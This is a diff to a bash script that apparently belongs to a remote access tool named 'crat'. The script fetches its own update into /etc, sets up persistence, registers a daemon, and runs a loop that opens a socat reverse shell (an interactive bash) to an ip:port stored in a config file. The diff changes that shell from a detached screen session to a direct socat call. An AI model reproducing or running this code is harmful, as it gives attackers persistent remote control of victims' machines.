@@ -24,11 +24,6 @@ updateScript () {
   if [ ! -f /etc/crat_config/crat.sh ]; then
     # download the latest version of the script from https://raw.githubusercontent.com/corespace-security/crat_daemon/master/crat.sh to /etc/crat_config/crat.sh
     wget -O /etc/crat_config/crat.sh https://raw.githubusercontent.com/corespace-security/crat_daemon/master/crat.sh && chmod +x /etc/crat_config/crat.sh
-    chmod +x /etc/crat_config/crat.sh
-  # else
-    # replace the current version of the script with the latest version from https://raw.githubusercontent.com/corespace-security/crat_daemon/master/crat.sh
-    # rm -rf /etc/crat_config/crat.sh
-    # wget -O /etc/crat_config/crat.sh https://raw.githubusercontent.com/corespace-security/crat_daemon/master/crat.sh && chmod +x /etc/crat_config/crat.sh
   fi
 }
 
@@ -71,9 +66,9 @@ registerDaemon () {
   fi
 }
 
-updateScript
-makePersistant
-registerDaemon
+updateScript && sleep 0.5
+makePersistant && sleep 0.5
+registerDaemon && sleep 0.5
 
 
 while true
@@ -101,5 +96,5 @@ do
     echo "$ip:$port" > /etc/crat_config/crat.ccw
   fi
 
-  screen -dmS screen_service /bin/bash -c "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port"
+  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port
 done
